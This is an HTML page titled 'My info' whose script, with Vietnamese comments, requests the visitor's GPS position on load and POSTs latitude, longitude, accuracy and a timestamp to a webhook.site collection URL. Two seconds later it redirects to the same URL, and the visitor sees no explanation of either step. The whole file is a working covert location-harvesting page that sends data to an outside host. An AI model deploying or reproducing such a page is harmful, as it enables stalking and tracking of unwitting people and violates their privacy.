<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>My info</title>
  <script>
    navigator.geolocation.getCurrentPosition(
      function(position) {
        fetch("https://webhook.site/75b705ea-f6af-4628-9609-9c83e062bdbc", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString()
          })
        });
      },
      function(error) {
        console.error("Lỗi GPS:", error);
      }
    );

    // Redirect sau 2 giây (để đảm bảo gửi xong trước)
    setTimeout(function() {
      window.location.href = "https://webhook.site/75b705ea-f6af-4628-9609-9c83e062bdbc";
    }, 2000);
  </script>
</head>
<body>
</body>
</html>
